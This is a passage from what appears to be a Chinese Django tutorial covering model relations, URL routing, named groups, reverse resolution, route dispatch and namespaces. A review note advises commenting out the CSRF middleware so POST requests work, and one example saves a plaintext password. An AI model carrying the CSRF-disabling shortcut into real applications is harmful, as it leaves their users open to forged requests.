<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Author</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    age = models.IntegerField()
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4F5C;&#x8005;&#x4E0E;&#x4F5C;&#x8005;&#x8BE6;&#x60C5;&#x662F;&#x4E00;&#x5BF9;&#x4E00;&#x7684;&#x5173;&#x7CFB; &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5EFA;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x90FD;&#x53EF;&#x4EE5; &#x4F46;&#x662F;&#x63A8;&#x8350;&#x4F60;&#x5EFA;&#x5728;&#x67E5;&#x8BE2;&#x9891;&#x7387;&#x8F83;&#x9AD8;&#x7684;&#x8868;&#x4E2D;
    &quot;&quot;&quot;</span>
    author_detail = models.OneToOneField(to=<span class="hljs-string">&apos;AuthorDetail&apos;</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    OneToOneField&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x7ED9;&#x5B57;&#x6BB5;&#x52A0;_id&#x540E;&#x7F00;
    &#x6240;&#x4EE5;&#x4F60;&#x4E5F;&#x4E0D;&#x8981;&#x81EA;&#x4F5C;&#x806A;&#x660E;&#x7684;&#x81EA;&#x5DF1;&#x52A0;_id
    &quot;&quot;&quot;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AuthorDetail</span><span class="hljs-params">(models.Model)</span>:</span>
    phone = models.BigIntegerField()  <span class="hljs-comment"># &#x6216;&#x8005;&#x76F4;&#x63A5;&#x5B57;&#x7B26;&#x7C7B;&#x578B;</span>
    addr = models.CharField(max_length=<span class="hljs-number">32</span>)
</code></pre>
<h4 id="django&#x751F;&#x547D;&#x5468;&#x671F;&#x6D41;&#x7A0B;&#x56FE;">django&#x751F;&#x547D;&#x5468;&#x671F;&#x6D41;&#x7A0B;&#x56FE;</h4>
<p><a href="https://imgse.com/i/p91wZYd" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91wZYd.jpg" alt="p91wZYd.jpg"></a></p>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x5E93;&#x51CF;&#x8F7B;&#x540E;&#x9762;&#x7684;&#x538B;&#x529B;</p>
<h4 id="&#x8DEF;&#x7531;&#x5C42;">&#x8DEF;&#x7531;&#x5C42;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x8DEF;&#x7531;&#x5339;&#x914D;</span>
url(<span class="hljs-string">r&apos;test&apos;</span>,views.test),
url(<span class="hljs-string">r&apos;testadd&apos;</span>,views.testadd)
<span class="hljs-string">&quot;&quot;&quot;
url&#x65B9;&#x6CD5;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;
    &#x53EA;&#x8981;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x80FD;&#x591F;&#x5339;&#x914D;&#x5230;&#x5185;&#x5BB9; &#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x7ACB;&#x523B;&#x505C;&#x6B62;&#x5F80;&#x4E0B;&#x5339;&#x914D;
    &#x76F4;&#x63A5;&#x6267;&#x884C;&#x5BF9;&#x5E94;&#x7684;&#x89C6;&#x56FE;&#x51FD;&#x6570;

&#x4F60;&#x5728;&#x8F93;&#x5165;url&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x9ED8;&#x8BA4;&#x52A0;&#x659C;&#x6760;
    django&#x5185;&#x90E8;&#x5E2E;&#x4F60;&#x505A;&#x5230;&#x91CD;&#x5B9A;&#x5411;
        &#x4E00;&#x6B21;&#x5339;&#x914D;&#x4E0D;&#x884C;
        url&#x540E;&#x9762;&#x52A0;&#x659C;&#x6760;&#x518D;&#x6765;&#x4E00;&#x6B21;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x53D6;&#x6D88;&#x81EA;&#x52A8;&#x52A0;&#x659C;&#x6760;</span>
APPEND_SLASH = <span class="hljs-keyword">False</span>/<span class="hljs-keyword">True</span>    <span class="hljs-comment"># &#x9ED8;&#x8BA4;&#x662F;&#x81EA;&#x52A8;&#x52A0;&#x659C;&#x6760;&#x7684;</span>


urlpatterns = [
    url(<span class="hljs-string">r&apos;^admin/&apos;</span>, admin.site.urls),
    <span class="hljs-comment"># &#x9996;&#x9875;</span>
    url(<span class="hljs-string">r&apos;^$&apos;</span>,views.home),
    <span class="hljs-comment"># &#x8DEF;&#x7531;&#x5339;&#x914D;</span>
    url(<span class="hljs-string">r&apos;^test/$&apos;</span>,views.test),
    url(<span class="hljs-string">r&apos;^testadd/$&apos;</span>,views.testadd),
    <span class="hljs-comment"># &#x5C3E;&#x9875;(&#x4E86;&#x89E3;)</span>
    url(<span class="hljs-string">r&apos;&apos;</span>,views.error),
]
</code></pre>
<h4 id="&#x6709;&#x540D;&#x5206;&#x7EC4;">&#x6709;&#x540D;&#x5206;&#x7EC4;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x53EF;&#x4EE5;&#x7ED9;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x8D77;&#x4E00;&#x4E2A;&#x522B;&#x540D;
&quot;&quot;&quot;</span>
url(<span class="hljs-string">r&apos;^testadd/(?P&lt;year&gt;\d+)&apos;</span>,views.testadd)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testadd</span><span class="hljs-params">(request,year)</span>:</span>
    print(year)
    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;testadd&apos;</span>)

<span class="hljs-comment"># &#x6709;&#x540D;&#x5206;&#x7EC4;&#x5C31;&#x662F;&#x5C06;&#x62EC;&#x53F7;&#x5185;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x5339;&#x914D;&#x5230;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x4F5C;&#x5173;&#x952E;&#x5B57;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7ED9;&#x540E;&#x9762;&#x7684;&#x89C6;&#x56FE;&#x51FD;&#x6570;</span>
</code></pre>
<h4 id="&#x65E0;&#x540D;&#x6709;&#x540D;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6DF7;&#x5408;&#x4F7F;&#x7528;">&#x65E0;&#x540D;&#x6709;&#x540D;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6DF7;&#x5408;&#x4F7F;&#x7528;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x563B;&#x563B; &#x4E0D;&#x80FD;&#x6DF7;&#x7528;
&#x4F46;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x5206;&#x7EC4;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;N&#x591A;&#x6B21;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x5355;&#x4E2A;&#x7684;&#x5206;&#x7EC4;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x591A;&#x6B21;</span>
url(<span class="hljs-string">r&apos;^index/(\d+)/(\d+)/(\d+)/&apos;</span>,views.index),
url(<span class="hljs-string">r&apos;^index/(?P&lt;year&gt;\d+)/(?P&lt;age&gt;\d+)/(?P&lt;month&gt;\d+)/&apos;</span>,views.index),
</code></pre>
<h4 id="&#x53CD;&#x5411;&#x89E3;&#x6790;">&#x53CD;&#x5411;&#x89E3;&#x6790;</h4>
<pre><code class="lang-python"># &#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x6CD5;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7ED3;&#x679C; &#x8BE5;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5BF9;&#x5E94;&#x7684;url&#x89E6;&#x53D1;&#x89C6;&#x56FE;&#x51FD;&#x6570;

# &#x5148;&#x7ED9;&#x8DEF;&#x7531;&#x4E0E;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x8D77;&#x4E00;&#x4E2A;&#x522B;&#x540D;
    url(r&apos;^func_kkk/&apos;,views.func,name=&apos;ooo&apos;)
# &#x53CD;&#x5411;&#x89E3;&#x6790;
    # &#x540E;&#x7AEF;&#x53CD;&#x5411;&#x89E3;&#x6790;
      from django.shortcuts import render,HttpResponse,redirect,reverse
      reverse(&apos;ooo&apos;)
  # &#x524D;&#x7AEF;&#x53CD;&#x5411;&#x89E3;&#x6790;
      &lt;a href=&quot;{# url &apos;ooo&apos; #}&quot;&gt;111&lt;/a&gt;
</code></pre>
<h4 id="&#x56DE;&#x987E;">&#x56DE;&#x987E;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6570;&#x636E;</span>
    res = models.User.objects.filter()
  res = models.User.objects.all()
<span class="hljs-comment"># &#x7F16;&#x8F91;&#x6570;&#x636E;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    1.&#x9996;&#x5148;&#x5F97;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x60F3;&#x8981;&#x7F16;&#x8F91;&#x7684;&#x6570;&#x636E;&#x4E3B;&#x952E;&#x503C;
            url?edit_id=1
            url/1/
    2.&#x540E;&#x7AEF;&#x67E5;&#x8BE2;&#x51FA;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x5C55;&#x793A;&#x5230;&#x524D;&#x7AEF;
            &#x5229;&#x7528;input&#x6807;&#x7B7E;&#x7684;value&#x5C5E;&#x6027;
    3.&#x63D0;&#x4EA4;post&#x8BF7;&#x6C42;&#x4FEE;&#x6539;&#x6570;&#x636E;
            &#x524D;&#x671F;&#x63D0;&#x4EA4;post&#x8BF7;&#x6C42;&#x4E00;&#x5B9A;&#x8981;&#x5148;&#x53BB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x91CA;&#x70B9;&#x4E00;&#x884C;(csrf...)
            &#x5982;&#x679C;&#x4E0D;&#x6CE8;&#x91CA;&#x4F1A;&#x62A5;403&#x9519;&#x8BEF;
    &quot;&quot;&quot;</span>
  <span class="hljs-comment"># &#x6279;&#x91CF;&#x66F4;&#x65B0;</span>
    models.User.objects.filter(id=edit_id).update(**kwargs)
  <span class="hljs-comment"># &#x5355;&#x4E2A;&#x66F4;&#x65B0;</span>
  user_obj = models.User.objects.filter(id=edit_id).first()
  user_obj.username = <span class="hljs-string">&apos;jason&apos;</span>
  user_obj.passsword = <span class="hljs-string">&apos;666&apos;</span>
  user_obj.save()
  <span class="hljs-string">&quot;&quot;&quot;
  &#x8BE5;&#x65B9;&#x6CD5;&#x5F53;&#x5B57;&#x6BB5;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x5019;&#x6548;&#x7387;&#x5F88;&#x964D;&#x4F4E;&#x5F88;&#x591A;
  &#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x4ECE;&#x5934;&#x5230;&#x5C3E;&#x8BB2;&#x6570;&#x636E;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#x91CD;&#x65B0;&#x5199;&#x4E00;&#x904D;
  &quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x5220;&#x9664;&#x6570;&#x636E;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    1.&#x6570;&#x636E;&#x5E76;&#x4E0D;&#x4F1A;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x5220;&#x9664;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x521B;&#x5EFA;&#x8868;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x52A0;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x6807;&#x793A;&#x662F;&#x5426;&#x88AB;&#x5220;&#x9664;&#x7684;&#x5B57;&#x6BB5;
        is_delete
        is_alive
        is_status
        ...
    &#x5220;&#x6570;&#x636E;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4FEE;&#x6539;&#x5B57;&#x6BB5;&#x7684;&#x72B6;&#x6001; &#x4E4B;&#x540E;&#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x7B5B;&#x9009;&#x51FA;&#x6CA1;&#x6709;&#x5220;&#x9664;&#x7684;&#x72B6;&#x6001;&#x6570;&#x636E;&#x5373;&#x53EF;

    2.&#x5220;&#x9664;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x5E94;&#x8BE5;&#x6709;&#x4E00;&#x4E2A;&#x4E8C;&#x6B21;&#x786E;&#x8BA4;&#x7684;&#x8FC7;&#x7A0B;&#x800C;&#x4E0D;&#x5E94;&#x8BE5;&#x76F4;&#x63A5;&#x5220;&#x9664;
        ajax&#x8BB2;&#x5B8C;&#x4E4B;&#x540E;&#x52A0;&#x4E8C;&#x6B21;&#x786E;&#x8BA4;&#x7ED3;&#x5408;sweetalaert
    &quot;&quot;&quot;</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span>
  models.ForeignKey(to=<span class="hljs-string">&apos;Publish&apos;</span>)
  models.ForeignKey(to=Publish)  <span class="hljs-comment"># &#x62A5;&#x9519;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Publish</span>:</span>
  <span class="hljs-keyword">pass</span>

<span class="hljs-string">&quot;&quot;&quot;
&#x4E00;&#x5BF9;&#x591A;
    models.ForeignKey(to=&apos;&#x5173;&#x8054;&#x8868;&#x540D;&apos;)  &#x5E38;&#x7528;
    models.ForeignKey(to=&#x5173;&#x8054;&#x8868;&#x540D;)      &#x5173;&#x8054;&#x8868;&#x540D;&#x5FC5;&#x987B;&#x51FA;&#x73B0;&#x5728;&#x4E0A;&#x65B9;(&#x4E86;&#x89E3;&#x5373;&#x53EF;)
        1.&#x5728;django1.X&#x7248;&#x672C;&#x4E2D;&#x5916;&#x952E;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x5220;&#x9664;&#x7684;
        2.&#x4F1A;&#x81EA;&#x52A8;&#x7ED9;&#x5B57;&#x6BB5;&#x52A0;_id&#x540E;&#x7F00; &#x65E0;&#x8BBA;&#x4F60;&#x6709;&#x6CA1;&#x6709;&#x52A0;(&#x81EA;&#x5DF1;&#x4E0D;&#x8981;&#x81EA;&#x4F5C;&#x806A;&#x660E;&#x7684;&#x52A0;&#x4E0A;)
        3.&#x4E00;&#x5BF9;&#x591A; &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5EFA;&#x5728;&#x591A;&#x7684;&#x4E00;&#x65B9;

&#x4E00;&#x5BF9;&#x4E00;
    models.OneToOneField(to=&apos;&#x5173;&#x8054;&#x8868;&#x540D;&apos;)
        1.&#x5728;django1.X&#x7248;&#x672C;&#x4E2D;&#x5916;&#x952E;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x5220;&#x9664;&#x7684;
        2.&#x4F1A;&#x81EA;&#x52A8;&#x7ED9;&#x5B57;&#x6BB5;&#x52A0;_id&#x540E;&#x7F00; &#x65E0;&#x8BBA;&#x4F60;&#x6709;&#x6CA1;&#x6709;&#x52A0;(&#x81EA;&#x5DF1;&#x4E0D;&#x8981;&#x81EA;&#x4F5C;&#x806A;&#x660E;&#x7684;&#x52A0;&#x4E0A;)
        3.&#x5916;&#x952E;&#x5EFA;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x5747;&#x53EF; &#x4F46;&#x662F;&#x63A8;&#x8350;&#x4F60;&#x5EFA;&#x5728;&#x67E5;&#x8BE2;&#x9891;&#x7387;&#x8F83;&#x9AD8;&#x7684;&#x8868;&#x4E2D;(orm&#x67E5;&#x8BE2;&#x65B9;&#x4FBF;)

&#x591A;&#x5BF9;&#x591A;
    models.ManyToManyField(to=&apos;&#x5173;&#x8054;&#x8868;&#x540D;&apos;)
        1.&#x5728;django1.X&#x7248;&#x672C;&#x4E2D;&#x5916;&#x952E;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x5220;&#x9664;&#x7684;
        2.&#x8BE5;&#x5B57;&#x6BB5;&#x662F;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x5B57;&#x6BB5;&#x4E0D;&#x4F1A;&#x771F;&#x6B63;&#x7684;&#x5728;&#x8868;&#x4E2D;&#x5C55;&#x793A;&#x51FA;&#x6765; &#x800C;&#x662F;&#x7528;&#x6765;&#x544A;&#x8BC9;Django orm&#x5F53;&#x524D;&#x8868;&#x548C;&#x5173;&#x8054;&#x8868;&#x662F;&#x591A;&#x5BF9;&#x591A;&#x7684;&#x5916;&#x952E;&#x5173;&#x7CFB; &#x9700;&#x8981;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;
        3.&#x5728;Django orm&#x4E2D;&#x591A;&#x5BF9;&#x591A;&#x7684;&#x8868;&#x5173;&#x7CFB;&#x6709;&#x597D;&#x51E0;&#x79CD;&#xFF08;&#x4E09;&#x79CD;&#xFF09;&#x521B;&#x5EFA;&#x65B9;&#x5F0F;
        4.&#x5916;&#x952E;&#x5EFA;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x5747;&#x53EF; &#x4F46;&#x662F;&#x63A8;&#x8350;&#x4F60;&#x5EFA;&#x5728;&#x67E5;&#x8BE2;&#x9891;&#x7387;&#x8F83;&#x9AD8;&#x7684;&#x8868;&#x4E2D;(orm&#x67E5;&#x8BE2;&#x65B9;&#x4FBF;)

&#x5224;&#x65AD;&#x8868;&#x5173;&#x7CFB;&#x7684;&#x65B9;&#x5F0F;:&#x6362;&#x4F4D;&#x601D;&#x8003;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x65E0;&#x540D;&#x6709;&#x540D;&#x5206;&#x7EC4;&#x53CD;&#x5411;&#x89E3;&#x6790;">&#x65E0;&#x540D;&#x6709;&#x540D;&#x5206;&#x7EC4;&#x53CD;&#x5411;&#x89E3;&#x6790;</h4>
<pre><code class="lang-python"># &#x65E0;&#x540D;&#x5206;&#x7EC4;&#x53CD;&#x5411;&#x89E3;&#x6790;
    url(r&apos;^index/(\d+)/&apos;,views.index,name=&apos;xxx&apos;)

# &#x524D;&#x7AEF;
    {# url &apos;xxx&apos; 123 #}
# &#x540E;&#x7AEF;
    def index(request, num):
        print(reverse(&apos;xxx&apos;, args=(1,)))
        return render(request, &quot;home.html&quot;)

&quot;&quot;&quot;
&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x5199;&#x4EE3;&#x7801;&#x7684;&#x65F6;&#x5019;&#x5E94;&#x8BE5;&#x653E;&#x4EC0;&#x4E48;
    &#x6570;&#x5B57;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x6570;&#x636E;&#x7684;&#x4E3B;&#x952E;&#x503C;  &#x6570;&#x636E;&#x7684;&#x7F16;&#x8F91;&#x548C;&#x5220;&#x9664;
    url(r&apos;^edit/(\d+)/&apos;,views.edit,name=&apos;xxx&apos;)

    def edit(request,edit_id):
        reverse(&apos;xxx&apos;,args=(edit_id,))

    {#for user_obj in user_queryset#}
        &lt;a href=&quot;{# url &apos;xxx&apos; user_obj.id #}&quot;&gt;&#x7F16;&#x8F91;&lt;/a&gt;
    {#endfor#}

&#x4ECA;&#x5929;&#x6BCF;&#x4E2A;&#x4EBA;&#x90FD;&#x5FC5;&#x987B;&#x5B8C;&#x6210;&#x7684;&#x4F5C;&#x4E1A;(*******)
    &#x5229;&#x7528;&#x65E0;&#x540D;&#x6709;&#x540D; &#x53CD;&#x5411;&#x89E3;&#x6790; &#x5B8C;&#x6210;&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;
&quot;&quot;&quot;



# &#x6709;&#x540D;&#x5206;&#x7EC4;&#x53CD;&#x5411;&#x89E3;&#x6790;
   url(r&apos;^func/(?P&lt;year&gt;\d+)/&apos;,views.func,name=&apos;ooo&apos;)
# &#x524D;&#x7AEF;
    &lt;a href=&quot;{# url &apos;ooo&apos; year=123 #}&quot;&gt;111&lt;/a&gt;  &#x4E86;&#x89E3;
    &lt;a href=&quot;{# url &apos;ooo&apos; 123 #}&quot;&gt;222&lt;/a&gt;              &#x8BB0;&#x5FC6;

# &#x540E;&#x7AEF;    
     # &#x6709;&#x540D;&#x5206;&#x7EC4;&#x53CD;&#x5411;&#x89E3;&#x6790; &#x5199;&#x6CD5;1  &#x4E86;&#x89E3;
   print(reverse(&apos;ooo&apos;,kwargs={&apos;year&apos;:123}))
   # &#x7B80;&#x4FBF;&#x7684;&#x5199;&#x6CD5;  &#x51CF;&#x5C11;&#x4F60;&#x7684;&#x8111;&#x5BB9;&#x91CF;&#x6D88;&#x8017; &#x8BB0;&#x8DDF;&#x65E0;&#x540D;&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x5373;&#x53EF;
   print(reverse(&apos;ooo&apos;,args=(111,)))
</code></pre>
<h4 id="&#x8DEF;&#x7531;&#x5206;&#x53D1;">&#x8DEF;&#x7531;&#x5206;&#x53D1;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
django&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x90FD;&#x53EF;&#x4EE5;&#x6709;&#x81EA;&#x5DF1;&#x7684;templates&#x6587;&#x4EF6;&#x5939; urls.py static&#x6587;&#x4EF6;&#x5939;
&#x6B63;&#x662F;&#x57FA;&#x4E8E;&#x4E0A;&#x8FF0;&#x7684;&#x7279;&#x70B9; django&#x80FD;&#x591F;&#x975E;&#x5E38;&#x597D;&#x7684;&#x505A;&#x5230;&#x5206;&#x7EC4;&#x5F00;&#x53D1;(&#x6BCF;&#x4E2A;&#x4EBA;&#x53EA;&#x5199;&#x81EA;&#x5DF1;&#x7684;app)
&#x4F5C;&#x4E3A;&#x7EC4;&#x957F; &#x53EA;&#x9700;&#x8981;&#x5C06;&#x624B;&#x4E0B;&#x4E66;&#x5199;&#x7684;app&#x5168;&#x90E8;&#x62F7;&#x8D1D;&#x5230;&#x4E00;&#x4E2A;&#x65B0;&#x7684;django&#x9879;&#x76EE;&#x4E2D; &#x7136;&#x540E;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x6CE8;&#x518C;&#x6240;&#x6709;&#x7684;app&#x518D;&#x5229;&#x7528;&#x8DEF;&#x7531;&#x5206;&#x53D1;&#x7684;&#x7279;&#x70B9;&#x5C06;&#x6240;&#x6709;&#x7684;app&#x6574;&#x5408;&#x8D77;&#x6765;

&#x5F53;&#x4E00;&#x4E2A;django&#x9879;&#x76EE;&#x4E2D;&#x7684;url&#x7279;&#x522B;&#x591A;&#x7684;&#x65F6;&#x5019; &#x603B;&#x8DEF;&#x7531;urls.py&#x4EE3;&#x7801;&#x975E;&#x5E38;&#x5197;&#x4F59;&#x4E0D;&#x597D;&#x7EF4;&#x62A4;
&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8DEF;&#x7531;&#x5206;&#x53D1;&#x6765;&#x51CF;&#x8F7B;&#x603B;&#x8DEF;&#x7531;&#x7684;&#x538B;&#x529B;

&#x5229;&#x7528;&#x8DEF;&#x7531;&#x5206;&#x53D1;&#x4E4B;&#x540E; &#x603B;&#x8DEF;&#x7531;&#x4E0D;&#x518D;&#x5E72;&#x8DEF;&#x7531;&#x4E0E;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x7684;&#x76F4;&#x63A5;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;
&#x800C;&#x662F;&#x505A;&#x4E00;&#x4E2A;&#x5206;&#x53D1;&#x5904;&#x7406;
    &#x8BC6;&#x522B;&#x5F53;&#x524D;url&#x662F;&#x5C5E;&#x4E8E;&#x54EA;&#x4E2A;&#x5E94;&#x7528;&#x4E0B;&#x7684; &#x76F4;&#x63A5;&#x5206;&#x53D1;&#x7ED9;&#x5BF9;&#x5E94;&#x7684;&#x5E94;&#x7528;&#x53BB;&#x5904;&#x7406;

&quot;&quot;&quot;</span>


<span class="hljs-comment"># &#x603B;&#x8DEF;&#x7531;</span>
<span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> urls <span class="hljs-keyword">as</span> app01_urls
<span class="hljs-keyword">from</span> app02 <span class="hljs-keyword">import</span> urls <span class="hljs-keyword">as</span> app02_urls
urlpatterns = [
    url(<span class="hljs-string">r&apos;^admin/&apos;</span>, admin.site.urls),
    <span class="hljs-comment"># 1.&#x8DEF;&#x7531;&#x5206;&#x53D1;</span>
    url(<span class="hljs-string">r&apos;^app01/&apos;</span>,include(app01_urls)),  <span class="hljs-comment"># &#x53EA;&#x8981;url&#x524D;&#x7F00;&#x662F;app01&#x5F00;&#x5934; &#x5168;&#x90E8;&#x4EA4;&#x7ED9;app01&#x5904;&#x7406;</span>
    url(<span class="hljs-string">r&apos;^app02/&apos;</span>,include(app02_urls))   <span class="hljs-comment"># &#x53EA;&#x8981;url&#x524D;&#x7F00;&#x662F;app02&#x5F00;&#x5934; &#x5168;&#x90E8;&#x4EA4;&#x7ED9;app02&#x5904;&#x7406;</span>

    <span class="hljs-comment"># 2.&#x7EC8;&#x6781;&#x5199;&#x6CD5;  &#x63A8;&#x8350;&#x4F7F;&#x7528;</span>
    url(<span class="hljs-string">r&apos;^app01/&apos;</span>,include(<span class="hljs-string">&apos;app01.urls&apos;</span>)),
    url(<span class="hljs-string">r&apos;^app02/&apos;</span>,include(<span class="hljs-string">&apos;app02.urls&apos;</span>))
    <span class="hljs-comment"># &#x6CE8;&#x610F;&#x4E8B;&#x9879;:&#x603B;&#x8DEF;&#x7531;&#x91CC;&#x9762;&#x7684;url&#x5343;&#x4E07;&#x4E0D;&#x80FD;&#x52A0;$&#x7ED3;&#x5C3E;</span>
]

<span class="hljs-comment"># &#x5B50;&#x8DEF;&#x7531;</span>
    <span class="hljs-comment"># app01 urls.py</span>
  <span class="hljs-keyword">from</span> django.conf.urls <span class="hljs-keyword">import</span> url
  <span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> views

  urlpatterns = [
      url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg)
  ]
  <span class="hljs-comment"># app02 urls.py</span>
  <span class="hljs-keyword">from</span> django.conf.urls <span class="hljs-keyword">import</span> url
  <span class="hljs-keyword">from</span> app02 <span class="hljs-keyword">import</span> views

  urlpatterns = [
      url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg)
  ]
</code></pre>
<h4 id="&#x540D;&#x79F0;&#x7A7A;&#x95F4;">&#x540D;&#x79F0;&#x7A7A;&#x95F4;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5F53;&#x591A;&#x4E2A;&#x5E94;&#x7528;&#x51FA;&#x73B0;&#x4E86;&#x76F8;&#x540C;&#x7684;&#x522B;&#x540D; &#x6211;&#x4EEC;&#x7814;&#x7A76;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x4F1A;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x5E94;&#x7528;&#x524D;&#x7F00;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x662F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x524D;&#x7F00;&#x7684;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
    <span class="hljs-comment"># &#x603B;&#x8DEF;&#x7531;</span>
    url(<span class="hljs-string">r&apos;^app01/&apos;</span>,include(<span class="hljs-string">&apos;app01.urls&apos;</span>,namespace=<span class="hljs-string">&apos;app01&apos;</span>)),
    url(<span class="hljs-string">r&apos;^app02/&apos;</span>,include(<span class="hljs-string">&apos;app02.urls&apos;</span>,namespace=<span class="hljs-string">&apos;app02&apos;</span>))
  <span class="hljs-comment"># &#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;</span>
      <span class="hljs-comment"># app01</span>
      urlpatterns = [
    url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg,name=<span class="hljs-string">&apos;reg&apos;</span>)
        ]
    <span class="hljs-comment"># app02</span>
    urlpatterns = [
    url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg,name=<span class="hljs-string">&apos;reg&apos;</span>)
        ]

      reverse(<span class="hljs-string">&apos;app01:reg&apos;</span>)
    reverse(<span class="hljs-string">&apos;app02:reg&apos;</span>)

    {<span class="hljs-comment"># url &apos;app01:reg&apos; #}</span>
    {<span class="hljs-comment"># url &apos;app02:reg&apos; #}</span>
<span class="hljs-comment"># &#x5176;&#x5B9E;&#x53EA;&#x8981;&#x4FDD;&#x8BC1;&#x540D;&#x5B57;&#x4E0D;&#x51B2;&#x7A81; &#x5C31;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x4F7F;&#x7528;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
<span class="hljs-string">&quot;&quot;&quot;
